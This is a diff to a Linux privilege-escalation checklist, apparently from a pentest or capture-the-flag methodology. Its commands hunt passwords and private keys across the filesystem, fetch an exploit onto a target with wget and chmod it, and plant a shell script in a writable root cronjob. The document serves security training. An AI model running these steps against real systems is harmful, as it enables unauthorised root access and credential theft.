@@ -28,11 +28,14 @@
 - [ ] Scheduled tasks: `crontab -l` / `systemctl list-timers` / `ps`; or run `pspy` and leave it a while
 - [ ] Enumerate credentials with `locate pass/pwd/passwd/password | more` or `grep -rnw '/' -ie "PASSWORD/PWD/PASSWD/PASS/..." --color=always 2> /dev/null | less`
 - [ ] Looks for private keys: `locate id_rsa | less`
+- [ ] check PayloadsAllTheThings
 - [ ] check GTFOBINS
-- [ ] Automated sweep: `LinPEAS` / `LinEnum` / `linux-exploit-suggester` / `linuxprivchecker`
+- [ ] Automated sweep: `LinPEAS` / `linux-exploit-suggester` / `LinEnum` / `linuxprivchecker`
 
 ### Applying a vector
 
-- [ ] Transfer the exploit: `python3 -m http.server 80` (attacker) → `wget <IP>/<file>` (target) → `chmod +x <file>`
+- [ ] Try to apply known CVE's
+- Transfer the exploit: `python3 -m http.server 80` (attacker) → `wget <IP>/<file>` (target) → `chmod +x <file>`
 - [ ] Cronjob running as a higher privilege and writable? Drop your shell script in and wait
 - [ ] Landed root? `whoami` / `id` to confirm, then grab proof
+
